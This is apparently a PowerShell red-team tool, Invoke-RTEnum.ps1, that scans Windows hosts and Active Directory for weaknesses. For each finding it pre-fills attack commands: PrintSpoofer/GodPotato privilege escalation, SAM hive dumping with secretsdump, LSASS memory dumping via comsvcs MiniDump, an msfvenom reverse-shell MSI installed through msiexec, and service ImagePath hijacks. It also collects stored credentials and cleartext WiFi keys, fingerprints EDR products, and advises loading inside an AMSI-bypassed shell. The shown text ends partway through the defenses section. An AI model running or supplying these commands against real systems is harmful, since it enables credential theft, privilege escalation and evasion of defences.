<#
    Invoke-RTEnum.ps1
    ============================================================================
    General-purpose RED TEAM enumeration for Windows hosts & Active Directory.

    A generalized sibling of Invoke-CRTPEnum.ps1 (the CRTP-lab specialist):
    no hardcoded lab domain, works on a standalone box OR a domain member,
    and splits cleanly into LOCAL host triage and DOMAIN (AD) enumeration.

    GOAL
        Dump everything commonly misconfigured / vulnerable / directly
        exploitable into one timestamped folder, rank it HIGH/MED/INFO,
        and pre-fill the exact next-step command for each finding.

    DESIGN
        - ZERO hard dependencies. Local checks use native WMI/CIM/registry.
          AD checks fall back to raw System.DirectoryServices LDAP, so the
          one .ps1 runs with nothing else present.
        - Optional depth (auto-detected, never required): RSAT AD module,
          standalone Microsoft.ActiveDirectory.Management.dll (-ADModulePath),
          PowerView, PowerUp.
        - READ-ONLY. It finds and ranks targets and writes the command to
          attack each one to NEXT_STEPS.txt. It runs no offensive binary,
          changes no AD object, touches no AMSI.

    NOISE POSTURE
        Default = QUIET: local host + LDAP only (normal-looking AD traffic).
        Host-touching sweeps (admin-access / share hunt across every computer)
        are OFF unless you opt in with -HostSweep or scope with -Target.

    AV / DEFENDER NOTE
        NEXT_STEPS.txt embeds tool command STRINGS (mimikatz, Rubeus, certipy,
        secretsdump...). Defender real-time protection may quarantine this file
        on dot-source. Load it inside a bypassed shell or add a tools-folder
        exclusion on your own lab box. Syntax-check is always safe (no exec):
          [System.Management.Automation.Language.Parser]::ParseFile('.\Invoke-RTEnum.ps1',[ref]$null,[ref]$null)

    USAGE
        . .\Invoke-RTEnum.ps1
        Invoke-RTEnum                              # local + current domain
        Invoke-RTEnum -LocalOnly                   # skip all AD/network sections
        Invoke-RTEnum -Domain corp.local
        Invoke-RTEnum -Credential (Get-Credential) # enumerate AS a captured user (LDAP)
        Invoke-RTEnum -Only users,acls,delegation  # run only matching sections
        Invoke-RTEnum -Skip shares -HostSweep      # loud sweeps, minus share hunt
        Invoke-RTEnum -Target srv01 -OutDir C:\loot

    OUTPUT  <OutDir>\RTEnum_<host-or-domain>_<timestamp>\
        00_SUMMARY.txt       ranked HIGH/MED/INFO + recommended next move
        NEXT_STEPS.txt       exact command per finding, pre-filled
        findings.json        machine-readable (with -Json)
        NN_*.txt             per-section raw dumps
    ============================================================================
#>
[CmdletBinding()]
param(
    [string]$Domain,
    [string]$OutDir = "$PWD",
    [switch]$LocalOnly,          # host triage only; skip domain/network
    [switch]$Quick,              # skip the slower ACL/delegation DACL sweeps
    [switch]$HostSweep,          # fan out admin/share checks to every computer (LOUD)
    [string[]]$Target,           # scope host-centric sweeps to these host(s)
    [string]$ADModulePath,       # standalone Microsoft.ActiveDirectory.Management.dll
    [pscredential]$Credential,   # enumerate AS this identity (drives LDAP engine)
    [string[]]$Only,             # run ONLY sections matching these keywords
    [string[]]$Skip,             # skip sections matching these keywords
    [switch]$Json,               # also write findings.json
    [switch]$Zip,                # zip the run folder when done
    [string[]]$OwnedPrincipals = @()  # SIDs/names you control -> highlight actionable ACLs
)

function Invoke-RTEnum {
    [CmdletBinding()]
    param(
        [string]$Domain,
        [string]$OutDir = "$PWD",
        [switch]$LocalOnly,
        [switch]$Quick,
        [switch]$HostSweep,
        [string[]]$Target,
        [string]$ADModulePath,
        [pscredential]$Credential,
        [string[]]$Only,
        [string[]]$Skip,
        [switch]$Json,
        [switch]$Zip,
        [string[]]$OwnedPrincipals = @()
    )

    $ErrorActionPreference = 'SilentlyContinue'
    $WarningPreference     = 'SilentlyContinue'

    # ======================= framework =======================
    $summary = New-Object System.Collections.Generic.List[string]
    $nextList = New-Object System.Collections.Generic.List[object]
    $jsonBag  = [ordered]@{}

    function Log ($m,$c='Gray'){ Write-Host $m -ForegroundColor $c }
    function Sect($n){ Log "`n[==== $n ====]" 'Cyan' }
    function Flag($sev,$txt){
        $tag = switch($sev){ 'HIGH'{'[HIGH]'} 'MED'{'[MED ]'} default{'[INFO]'} }
        $line = "$tag $txt"
        if ($summary.Contains($line)){ return }     # de-dup identical findings
        $summary.Add($line)
        $col = switch($sev){ 'HIGH'{'Red'} 'MED'{'Yellow'} default{'DarkGray'} }
        Log $line $col
    }
    function AddNext($title,$cmd){ $nextList.Add([pscustomobject]@{ Title=$title; Cmd=$cmd }) }

    # Section gate for -Only / -Skip. -Skip wins; -Only restricts.
    function RunS([string[]]$keys){
        if ($Skip) { foreach($k in $keys){ foreach($s in $Skip){ if ($k -like "*$s*" -or $s -like "*$k*"){ return $false } } } }
        if ($Only) { foreach($k in $keys){ foreach($o in $Only){ if ($k -like "*$o*" -or $o -like "*$k*"){ return $true } } }; return $false }
        return $true
    }

    # Output folder keyed on host (local-only) or domain
    $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $tag   = if ($LocalOnly -or -not $Domain) { $env:COMPUTERNAME } else { $Domain }
    $run   = Join-Path $OutDir ("RTEnum_{0}_{1}" -f ($tag -replace '[\\/.:]','_'), $stamp)
    New-Item -ItemType Directory -Path $run -Force | Out-Null
    function Save($file,$data){ $data | Out-File -FilePath (Join-Path $run $file) -Encoding UTF8 -Width 4096 }
    function JBag($k,$v){ $jsonBag[$k] = $v }

    Log "[*] Invoke-RTEnum  ->  $run" 'Green'
    Log "[*] $(Get-Date)  as $(whoami)  quiet=$(-not ($HostSweep -or $Target))" 'DarkGray'

    # ======================= LOCAL: context / token =======================
    if (RunS @('context','token','whoami')) {
        Sect "Current context (who am I, token, privileges)"
        $ctx = New-Object System.Collections.Generic.List[string]
        $me = whoami 2>$null; $ctx.Add("User      : $me")
        try {
            $wi = [Security.Principal.WindowsIdentity]::GetCurrent()
            $ctx.Add("SID       : $($wi.User.Value)")
            $isAdmin = ([Security.Principal.WindowsPrincipal]$wi).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            $ctx.Add("LocalAdmin: $isAdmin")
            if ($isAdmin) { Flag 'MED' "Running in a local-administrator context on $env:COMPUTERNAME." }
            # integrity level
            $il = (whoami /groups 2>$null | Select-String 'Mandatory Label').ToString()
            if ($il -match 'High')    { $ctx.Add("Integrity : High") }
            elseif ($il -match 'System'){ $ctx.Add("Integrity : SYSTEM") }
            else { $ctx.Add("Integrity : Medium/Low (not elevated)") }
        } catch {}
        $ctx.Add(""); $ctx.Add("== Groups =="); $ctx.Add((whoami /groups 2>$null | Out-String))
        $ctx.Add("== Privileges =="); $priv = whoami /priv 2>$null; $ctx.Add(($priv | Out-String))
        # dangerous token privileges -> privesc primitives
        $dangPriv = @{
            'SeImpersonatePrivilege' = 'Potato attacks (JuicyPotato/PrintSpoofer/GodPotato) -> SYSTEM'
            'SeAssignPrimaryTokenPrivilege' = 'Token-assignment privesc (potato family)'
            'SeBackupPrivilege'      = 'Read any file -> dump SAM/SYSTEM/NTDS.dit'
            'SeRestorePrivilege'     = 'Write any file -> overwrite service binary / DLL'
            'SeTakeOwnershipPrivilege'='Take ownership of any object -> privesc'
            'SeDebugPrivilege'       = 'Debug any process -> dump LSASS'
            'SeLoadDriverPrivilege'  = 'Load a vulnerable driver -> kernel exec (BYOVD)'
            'SeManageVolumePrivilege'= 'Full disk access -> read protected files'
            'SeTcbPrivilege'         = 'Act as part of the OS -> full privesc'
        }
        foreach($p in $dangPriv.Keys){
            $row = $priv | Select-String $p
            if ($row -and ($row -match 'Enabled')) {
                Flag 'HIGH' "Token holds $p (Enabled): $($dangPriv[$p])."
                switch -Wildcard ($p){
                    'SeImpersonate*' { AddNext "SeImpersonate -> SYSTEM" ".\PrintSpoofer64.exe -i -c cmd    # or GodPotato -cmd `"cmd /c whoami`"" }
                    'SeBackup*'      { AddNext "SeBackup -> dump hives" "reg save HKLM\SAM sam.hiv; reg save HKLM\SYSTEM sys.hiv   # then: secretsdump.py -sam sam.hiv -system sys.hiv LOCAL" }
                    'SeDebug*'       { AddNext "SeDebug -> dump LSASS" "rundll32 C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id lsass.dmp full" }
                    'SeLoadDriver*'  { AddNext "SeLoadDriver -> BYOVD" "# load a signed-vulnerable driver (e.g. capcom/dbutil) then kernel exploit" }
                }
            } elseif ($row) {
                Flag 'MED' "Token holds $p (currently Disabled; can often be enabled)."
            }
        }
        Save '00_context.txt' ($ctx -join "`r`n")
        JBag 'context' @{ user="$me"; admin="$isAdmin" }
    }

    # ======================= LOCAL: system / patches =======================
    if (RunS @('system','os','patch','host')) {
        Sect "System info, OS build & hotfixes"
        $sys = New-Object System.Collections.Generic.List[string]
        try {
            $os = Get-CimInstance Win32_OperatingSystem
            $cs = Get-CimInstance Win32_ComputerSystem
            $sys.Add("Host      : $($cs.Name)  ($($cs.Domain))")
            $sys.Add("OS        : $($os.Caption)  build $($os.BuildNumber)")
            $sys.Add("Arch      : $($os.OSArchitecture)")
            $sys.Add("Installed : $($os.InstallDate)")
            $sys.Add("Booted    : $($os.LastBootUpTime)")
            $sys.Add("DomainJoin: $($cs.PartOfDomain)")
            # stale OS
            if ($os.Caption -match 'Windows 7|Windows XP|Server 2008|Server 2003|Windows Vista') {
                Flag 'HIGH' "Legacy/EOL OS: $($os.Caption) - likely unpatched kernel exploits (e.g. MS16-032/MS15-051 era)."
            }
        } catch {}
        $hf = Get-HotFix 2>$null | Sort-Object InstalledOn -Descending
        $sys.Add(""); $sys.Add("== Last 15 hotfixes =="); $sys.Add(($hf | Select-Object -First 15 HotFixID,InstalledOn | Format-Table -Auto | Out-String))
        if ($hf) {
            $last = ($hf | Select-Object -First 1).InstalledOn
            if ($last -and $last -lt (Get-Date).AddDays(-60)) { Flag 'MED' "No hotfix in 60+ days (last: $last) - check missing patches / local kernel exploits." }
        } else { Flag 'MED' "No hotfix history readable - possibly unpatched; run a patch-level privesc scan (Sherlock/Watson/wesng)." }
        Save '01_system.txt' ($sys -join "`r`n")
    }

    # ======================= LOCAL: CONFIRMED CVE matching =======================
    # Only CONFIRMED vulns reach the main findings. Windows updates are cumulative,
    # so if the host's latest patch is newer than a CVE's fix month it is SUPPRESSED
    # (already fixed). Deterministic tests (SAM ACL, Spooler+Point&Print) confirm or
    # suppress their CVEs directly. In-range-but-unconfirmable -> POTENTIAL side file.
    if (RunS @('cve','kernel','vuln','patch')) {
        Sect "Confirmed local-privesc CVEs (patch-date + evidence gated)"
        $cveDb=$null
        foreach($cand in @($env:CVEDB,(Join-Path $PSScriptRoot '..\data\cve-db.txt'),(Join-Path $PSScriptRoot 'data\cve-db.txt'),(Join-Path $PSScriptRoot 'cve-db.txt'),'.\data\cve-db.txt')){
            if ($cand -and (Test-Path $cand)){ $cveDb=(Resolve-Path $cand).Path; break }
        }
        if (-not $cveDb){ Flag 'INFO' "CVE DB not found (expected data\cve-db.txt) - run tools\update-cve-db.ps1 to fetch it." }
        else {
            $build = [int]((Get-CimInstance Win32_OperatingSystem).BuildNumber)
            # host patch recency as yyyy-MM (latest installed hotfix)
            $lastHf = Get-HotFix 2>$null | Where-Object { $_.InstalledOn } | Sort-Object InstalledOn -Descending | Select-Object -First 1
            $patchYM = if ($lastHf){ $lastHf.InstalledOn.ToString('yyyy-MM') } else { $null }
            $upd = (Get-Content $cveDb | Where-Object { $_ -like 'updated|*' }) -replace 'updated\|',''
            Flag 'INFO' "CVE DB updated $upd. Host build $build, last patch $(if($patchYM){$patchYM}else{'UNKNOWN'})."
            if (-not $patchYM){ Flag 'MED' "Patch history unreadable - cannot prove patched state; kernel/driver CVEs will be reported as POTENTIAL, not confirmed." }

            # deterministic precondition tests
            function Test-SamReadable {
                try { $acl = Get-Acl 'C:\Windows\System32\config\SAM' 2>$null
                    foreach($a in $acl.Access){ if ($a.AccessControlType -eq 'Allow' -and "$($a.FileSystemRights)" -match 'Read|FullControl' -and "$($a.IdentityReference)" -match 'Everyone|Authenticated Users|BUILTIN\\Users|\\Users$'){ return $true } } } catch {}
                return $false
            }
            # returns: 'off' (spooler stopped), 'weak' (explicitly weakened), 'default' (running, keys default)
            function Get-PrintNightmareState {
                if ((Get-Service Spooler -EA SilentlyContinue).Status -ne 'Running'){ return 'off' }
                $pp = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint' -EA SilentlyContinue
                if ($pp.RestrictDriverInstallationToAdministrators -eq 1){ return 'off' }   # explicit mitigation
                if ($pp.NoWarningNoElevationOnInstall -eq 1 -or $pp.RestrictDriverInstallationToAdministrators -eq 0){ return 'weak' }
                return 'default'   # absent keys = admin-only default on patched hosts; decide by patch date
            }

            $confirmed=New-Object System.Collections.Generic.List[string]
            $potential=New-Object System.Collections.Generic.List[string]
            $awN=0; $awList=New-Object System.Collections.Generic.List[string]
            foreach($line in (Get-Content $cveDb)){
                if ($line -notmatch '^windows\|'){ continue }
                $p = $line -split '\|'   # os|cve|name|type|min|max|sev|exploited|note|fixed|precond
                if ($p.Count -lt 9){ continue }
                if ($p[4] -eq 'kev'){ $awN++; $awList.Add("$($p[1])|$($p[2])|$($p[8])"); continue }
                $mn = if ($p[4]){ [int]$p[4] } else { 0 }
                $mx = if ($p[5]){ [int]$p[5] } else { [int]::MaxValue }
                if ($build -lt $mn -or $build -gt $mx){ continue }    # build not affected
                $cve=$p[1]; $name=$p[2]; $note=$p[8]
                $fixed = if ($p.Count -ge 10){ $p[9] } else { '' }
                $precond = if ($p.Count -ge 11){ $p[10] } else { '' }
                $itw = if ($p[7] -eq 'yes'){ ' *in-the-wild*' } else { '' }
                $sev = if ($p[7] -eq 'yes'){ 'HIGH' } else { $p[6] }

                # deterministic evidence first (authoritative)
                if ($precond -eq 'sam'){
                    if (Test-SamReadable){ Flag $sev "CONFIRMED $cve ($name)$itw - SAM hive ACL is readable by non-admins -> $note."; $confirmed.Add("$cve|CONFIRMED (SAM ACL readable)|$note") }
                    continue   # not readable => patched/mitigated => suppress
                }
                if ($precond -eq 'spooler'){
                    $st = Get-PrintNightmareState
                    if ($st -eq 'weak'){ Flag $sev "CONFIRMED $cve ($name)$itw - Point-and-Print is explicitly weakened (driver install by non-admins) -> $note."; $confirmed.Add("$cve|CONFIRMED (Point&Print weakened)|$note") }
                    elseif ($st -eq 'default' -and $patchYM -and $fixed -and $patchYM -lt $fixed){ Flag $sev "CONFIRMED $cve ($name)$itw - Spooler running and host unpatched ($patchYM < $fixed) -> $note."; $confirmed.Add("$cve|CONFIRMED (Spooler on, unpatched)|$note") }
                    elseif ($st -eq 'default' -and -not $patchYM){ $potential.Add("$cve|$name|$note (Spooler running, patch date unknown)|fixed=$fixed") }
                    continue   # 'off' / patched / default-on-patched-host => suppress
                }
                # patch-date gate (cumulative updates)
                if ($patchYM -and $fixed -and ($patchYM -ge $fixed)){ continue }        # patched after fix => suppress
                if ($patchYM -and $fixed -and ($patchYM -lt $fixed)){
                    Flag $sev "CONFIRMED $cve ($name)$itw - host last patched $patchYM, fix shipped $fixed (missing) -> $note."
                    $confirmed.Add("$cve|CONFIRMED (unpatched: $patchYM < $fixed)|$note")
                } else {
                    $potential.Add("$cve|$name|$note|fixed=$fixed")                      # patch date unknown
                }
            }
            if ($confirmed.Count){ Save '01b_cve_confirmed.txt' ($confirmed -join "`r`n") }
            else { Flag 'INFO' "No CVE could be CONFIRMED vulnerable on this host (patched or preconditions not met)." }
            if ($potential.Count){ Save '01c_cve_potential.txt' ("# in-range but UNCONFIRMED (verify file/KB versions manually)`r`n" + ($potential -join "`r`n")); Flag 'INFO' "$($potential.Count) in-range CVE(s) could not be confirmed offline -> 01c_cve_potential.txt (not counted as findings)." }
            if ($awN){ Save '01d_cve_latest_feed.txt' ($awList -join "`r`n"); Flag 'INFO' "$awN latest actively-exploited feed CVE(s) saved to 01d_cve_latest_feed.txt (awareness, not host-matched)." }
        }
    }

    # ======================= LOCAL: users / groups =======================
    if (RunS @('localusers','users','groups','admins')) {
        Sect "Local users, groups & administrators"
        $lu = New-Object System.Collections.Generic.List[string]
        $lu.Add("== Local users =="); $lu.Add((Get-CimInstance Win32_UserAccount -Filter "LocalAccount=True" 2>$null | Select-Object Name,Disabled,Lockout,PasswordRequired,PasswordExpires | Format-Table -Auto | Out-String))
        $lu.Add("== Local Administrators group ==")
        $adminMembers = net localgroup Administrators 2>$null
        $lu.Add(($adminMembers | Out-String))
        $lu.Add("== RDP users =="); $lu.Add((net localgroup "Remote Desktop Users" 2>$null | Out-String))
        # autologon creds in registry
        try {
            $wl = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 2>$null
            if ($wl.DefaultPassword) {
                Flag 'HIGH' "Autologon password stored in registry (Winlogon DefaultPassword) for $($wl.DefaultUserName)."
                AddNext "Autologon creds" "reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultPassword"
            }
        } catch {}
        Save '02_localusers.txt' ($lu -join "`r`n")
    }

    # ======================= LOCAL: services (unquoted / weak perms) =======================
    if (RunS @('services','service','unquoted','privesc')) {
        Sect "Services: unquoted paths, weak permissions, modifiable binaries"
        $svcOut = New-Object System.Collections.Generic.List[string]
        $svcs = Get-CimInstance Win32_Service 2>$null | Select-Object Name,DisplayName,State,StartMode,StartName,PathName
        # unquoted service paths with spaces (classic privesc)
        foreach($s in $svcs){
            $p = $s.PathName
            if ($p -and $p -notmatch '^\s*"' -and $p -match '\s' -and $p -match '\.exe' -and $p -notmatch '^(?i)(C:\\Windows\\)') {
                # path has a space, isn't quoted, not in \Windows\
                $exePart = ($p -split '\.exe')[0]
                if ($exePart -match '\s') {
                    Flag 'HIGH' "Unquoted service path: $($s.Name) -> $p"
                    AddNext "Unquoted path hijack: $($s.Name)" "# drop payload at an earlier space-break, e.g. C:\Program.exe ; then: sc start $($s.Name)"
                }
            }
        }
        # services whose binary / folder is writable by current user
        $myName = (whoami) 2>$null
        foreach($s in $svcs){
            $p = $s.PathName; if (-not $p) { continue }
            $exe = [regex]::Match($p,'^\s*"?([^"]+\.exe)').Groups[1].Value
            if (-not $exe) { continue }
            if (Test-Path $exe) {
                try {
                    $acl = Get-Acl $exe 2>$null
                    foreach($a in $acl.Access){
                        if ($a.AccessControlType -eq 'Allow' -and "$($a.FileSystemRights)" -match 'Write|FullControl|Modify' -and
                            "$($a.IdentityReference)" -match 'Everyone|Authenticated Users|Users|BUILTIN\\Users|'+[regex]::Escape($myName)) {
                            Flag 'HIGH' "Writable service binary: $($s.Name) -> $exe (writable by $($a.IdentityReference))."
                            AddNext "Service binary hijack: $($s.Name)" "# replace $exe with payload; sc stop $($s.Name); sc start $($s.Name)"
                            break
                        }
                    }
                } catch {}
            }
        }
        # AlwaysInstallElevated
        try {
            $hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' 2>$null).AlwaysInstallElevated
            $hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' 2>$null).AlwaysInstallElevated
            if ($hklm -eq 1 -and $hkcu -eq 1) {
                Flag 'HIGH' "AlwaysInstallElevated enabled (HKLM+HKCU) - any MSI runs as SYSTEM."
                AddNext "AlwaysInstallElevated" "msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f msi -o x.msi ; msiexec /quiet /qn /i x.msi"
            }
        } catch {}
        $svcOut.Add(($svcs | Format-Table -Auto | Out-String))
        Save '03_services.txt' ($svcOut -join "`r`n")
    }

    # ======================= LOCAL: deep privesc surface =======================
    if (RunS @('privesc','deep','dll','driver','registry','pipes')) {
        Sect "Deep privesc surface (service-registry ACLs, DLL hijack, drivers, UAC, pipes)"
        $dp = New-Object System.Collections.Generic.List[string]
        $myId = [Security.Principal.WindowsIdentity]::GetCurrent()
        $mySids = @($myId.User.Value) + @($myId.Groups | ForEach-Object { $_.Value })
        $broadSids = @('S-1-1-0','S-1-5-11','S-1-5-32-545')   # Everyone, Authenticated Users, Users
        function CanWrite($rights,$idRef){
            if ("$rights" -notmatch 'Write|FullControl|CreateSubKey|SetValue|Modify|TakeOwnership|ChangePermissions') { return $false }
            try { $sid=(New-Object Security.Principal.NTAccount($idRef)).Translate([Security.Principal.SecurityIdentifier]).Value } catch { $sid="$idRef" }
            return (($mySids -contains $sid) -or ($broadSids -contains $sid) -or ("$idRef" -match 'Everyone|Authenticated Users|\\Users$'))
        }

        # 1) Writable HKLM service registry keys -> set ImagePath -> SYSTEM
        $dp.Add("== Writable service registry keys ==")
        Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' 2>$null | Select-Object -First 400 | ForEach-Object {
            $kp = $_.PSPath; $sn=$_.PSChildName
            try {
                $acl = Get-Acl $kp 2>$null
                foreach($a in $acl.Access){
                    if ($a.AccessControlType -eq 'Allow' -and (CanWrite $a.RegistryRights $a.IdentityReference)){
                        Flag 'HIGH' "Writable service registry key: $sn (as $($a.IdentityReference)) -> set ImagePath -> SYSTEM."
                        AddNext "Service key hijack: $sn" "reg add HKLM\SYSTEM\CurrentControlSet\Services\$sn /v ImagePath /t REG_EXPAND_SZ /d <payload> /f ; sc start $sn"
                        $dp.Add("  $sn  (writable by $($a.IdentityReference))"); break
                    }
                }
            } catch {}
        }

        # 2) Writable directories in PATH -> DLL/binary planting (hijack)
        $dp.Add(""); $dp.Add("== Writable PATH dirs (DLL/binary hijack) ==")
        foreach($d in ($env:PATH -split ';')){
            if ($d -and (Test-Path $d)){
                try { $acl=Get-Acl $d 2>$null; foreach($a in $acl.Access){ if ($a.AccessControlType -eq 'Allow' -and (CanWrite $a.FileSystemRights $a.IdentityReference)){ Flag 'HIGH' "Writable PATH directory: $d -> plant a DLL/exe to hijack a privileged process."; $dp.Add("  $d"); break } } } catch {}
            }
        }

        # 3) Writable service binary PARENT folders (DLL sideload into service dir)
        $dp.Add(""); $dp.Add("== Writable folders holding a service binary ==")
        $svc2 = Get-CimInstance Win32_Service 2>$null | Select-Object Name,PathName,StartName
        $seenDir=@{}
        foreach($s in $svc2){
            $exe=[regex]::Match("$($s.PathName)",'^\s*"?([A-Za-z]:\\[^"]+?\.exe)').Groups[1].Value
            if (-not $exe){ continue }
            $dir=Split-Path $exe -Parent 2>$null
            if (-not $dir -or $seenDir[$dir] -or $dir -match '(?i)^C:\\Windows'){ continue }
            $seenDir[$dir]=$true
            if (Test-Path $dir){ try { $acl=Get-Acl $dir 2>$null; foreach($a in $acl.Access){ if ($a.AccessControlType -eq 'Allow' -and (CanWrite $a.FileSystemRights $a.IdentityReference)){ Flag 'HIGH' "Writable service directory: $dir ($($s.Name), runs as $($s.StartName)) -> DLL sideload / binary swap."; $dp.Add("  $dir  [$($s.Name)]"); break } } } catch {} }
        }

        # 4) Third-party kernel drivers (BYOVD surface) - just inventory non-MS signers
        $dp.Add(""); $dp.Add("== Non-Microsoft kernel drivers (BYOVD surface) ==")
        $drv = Get-CimInstance Win32_SystemDriver 2>$null | Where-Object { $_.State -eq 'Running' }
        $tp = foreach($x in $drv){ $p=$x.PathName -replace '^\\\?\?\\',''; if ($p -and (Test-Path $p)){ $sig=(Get-AuthenticodeSignature $p 2>$null).SignerCertificate.Subject; if ($sig -and $sig -notmatch 'Microsoft'){ "$($x.Name)  $p  [$sig]" } } }
        if ($tp){ $dp.Add(($tp -join "`r`n")); Flag 'INFO' "$(@($tp).Count) third-party kernel driver(s) loaded - check loldrivers.io for a known-vulnerable one (BYOVD)." }

        # 5) UAC posture / auto-elevate surface
        $dp.Add(""); $dp.Add("== UAC ==")
        $ua = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 2>$null
        $dp.Add("EnableLUA=$($ua.EnableLUA)  ConsentPromptBehaviorAdmin=$($ua.ConsentPromptBehaviorAdmin)")
        if ($ua.EnableLUA -eq 0){ Flag 'MED' "UAC disabled (EnableLUA=0) - admin tokens are not filtered." }
        elseif ($ua.ConsentPromptBehaviorAdmin -eq 0){ Flag 'MED' "UAC set to elevate without prompt (ConsentPromptBehaviorAdmin=0)." }

        # 6) Named pipes (potential impersonation / known-service pipes)
        $dp.Add(""); $dp.Add("== Named pipes ==")
        try { $pipes = [System.IO.Directory]::GetFiles('\\.\pipe\') 2>$null; $dp.Add(($pipes -join "`r`n")); if (($pipes -join ';') -match 'spoolss'){ Flag 'INFO' "Spooler pipe present (spoolss) - PrintNightmare/printerbug surface." } } catch {}

        Save '03b_privesc.txt' ($dp -join "`r`n")
    }

    # ======================= LOCAL: scheduled tasks / autoruns =======================
    if (RunS @('tasks','scheduled','autoruns','startup')) {
        Sect "Scheduled tasks & autoruns"
        $t = New-Object System.Collections.Generic.List[string]
        $tasks = Get-ScheduledTask 2>$null | Where-Object { $_.Principal.UserId -match 'SYSTEM|Administrator' -and $_.State -ne 'Disabled' }
        $t.Add("== Tasks running as SYSTEM/Admin =="); $t.Add(($tasks | Select-Object TaskName,@{n='RunAs';e={$_.Principal.UserId}},State | Format-Table -Auto | Out-String))
        # autorun registry keys
        foreach($k in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce','HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run')){
            $r = Get-ItemProperty $k 2>$null
            if ($r){ $t.Add("== $k =="); $t.Add(($r | Out-String)) }
        }
        Save '04_tasks.txt' ($t -join "`r`n")
    }

    # ======================= LOCAL: credentials on disk/registry =======================
    if (RunS @('creds','credentials','dpapi','secrets')) {
        Sect "Stored credentials (cmdkey / DPAPI / files / history / WiFi)"
        $cr = New-Object System.Collections.Generic.List[string]
        $cr.Add("== cmdkey (saved runas/RDP creds) =="); $cr.Add((cmdkey /list 2>$null | Out-String))
        if ((cmdkey /list 2>$null) -match 'Target:') { Flag 'MED' "Saved credentials present (cmdkey) - try: runas /savecred, or mimikatz dpapi::cred." }
        # DPAPI master keys & credential blobs
        $cr.Add("== DPAPI blobs =="); $cr.Add((cmd /c dir /a /s "$env:APPDATA\Microsoft\Credentials" "$env:LOCALAPPDATA\Microsoft\Credentials" 2>$null | Out-String))
        # PowerShell history
        $psh = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $psh) {
            $hits = Select-String -Path $psh -Pattern 'password|passwd|pwd|secret|-AsPlainText|ConvertTo-SecureString|Invoke-|credential|token|apikey' 2>$null
            if ($hits) { Flag 'MED' "PowerShell history contains credential-shaped lines ($psh)."; $cr.Add("== PS history hits =="); $cr.Add(($hits | Out-String)) }
        }
        # unattend / sysprep / common cred files
        $filePatterns = @('C:\Windows\Panther\Unattend.xml','C:\Windows\Panther\Unattended.xml','C:\Windows\System32\Sysprep\unattend.xml','C:\Windows\System32\Sysprep\Panther\unattend.xml','C:\unattend.xml','C:\sysprep.inf','C:\sysprep\sysprep.xml','C:\Windows\System32\sysprep\unattended.xml')
        foreach($f in $filePatterns){ if (Test-Path $f){ Flag 'HIGH' "Unattend/sysprep file present: $f (often holds a base64 local-admin password)."; $cr.Add("FOUND: $f") } }
        # web.config / config files with connection strings (shallow walk)
        $cfgHits = Get-ChildItem -Path C:\inetpub,C:\xampp,C:\Users\Public -Recurse -Include web.config,*.config,*.ini,*.ps1,*.bat -ErrorAction SilentlyContinue 2>$null |
                   Select-String -Pattern 'password\s*=|pwd\s*=|connectionString|Server=.*;.*Password' 2>$null | Select-Object -First 30
        if ($cfgHits){ Flag 'MED' "Config files contain password/connection-string patterns (see 05_creds.txt)."; $cr.Add("== config cred hits =="); $cr.Add(($cfgHits | Out-String)) }
        # saved WiFi profiles with cleartext key
        $cr.Add("== WiFi profiles ==")
        foreach($prof in (netsh wlan show profiles 2>$null | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() })){
            $key = netsh wlan show profile name="$prof" key=clear 2>$null | Select-String 'Key Content'
            if ($key){ $cr.Add("$prof -> $key"); Flag 'INFO' "WiFi key recoverable for profile '$prof'." }
        }
        # SAM/SYSTEM readability (shadow copies etc.)
        if (Test-Path 'C:\Windows\System32\config\SAM') {
            try { [IO.File]::OpenRead('C:\Windows\System32\config\SAM').Close(); Flag 'HIGH' "SAM hive is READABLE by current user - dump local hashes." ; AddNext "Dump SAM" "reg save HKLM\SAM sam; reg save HKLM\SYSTEM sys; secretsdump.py -sam sam -system sys LOCAL" } catch {}
        }
        Save '05_creds.txt' ($cr -join "`r`n")
    }

    # ======================= LOCAL: defenses =======================
    if (RunS @('defense','edr','av','defender','applocker')) {
        Sect "Defensive posture (Defender / AppLocker / logging / firewall)"
        $d = New-Object System.Collections.Generic.List[string]
        try {
            $mp = Get-MpComputerStatus 2>$null
            if ($mp){
                $d.Add("Defender RealTime : $($mp.RealTimeProtectionEnabled)")
                $d.Add("Defender Tamper   : $($mp.IsTamperProtected)")
                $d.Add("AntiMalware ver   : $($mp.AMEngineVersion)")
                if (-not $mp.RealTimeProtectionEnabled){ Flag 'MED' "Defender real-time protection is OFF." }
            }
        } catch {}
        # third-party EDR process fingerprints
        $edrMap = @{ 'MsMpEng'='Defender';'cb'='Carbon Black';'csfalcon'='CrowdStrike';'CSFalconService'='CrowdStrike';'SentinelAgent'='SentinelOne';'xagt'='FireEye/Trellix';'CylanceSvc'='Cylance';'Sysmon'='Sysmon';'elastic-agent'='Elastic';'TaniumClient'='Tanium';'wdatpservice'='Defender ATP' }
        $procs = Get-Process 2>$null | Select-Object -Expand Name -Unique
        foreach($k in $edrMap.Keys){ if ($procs -contains $k){ Flag 'INFO' "EDR/monitoring present: $($edrMap[$k]) ($k)." ; $d.Add("EDR: $($edrMap[$k]) ($k)") } }
        # AppLocker / WDAC
        try { $al = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue; if ($al){ $d.Add("AppLocker: configured"); Flag 'INFO' "AppLocker policy present - check for LOLBIN/writable allowed paths." } } catch {}
        # PowerShell logging
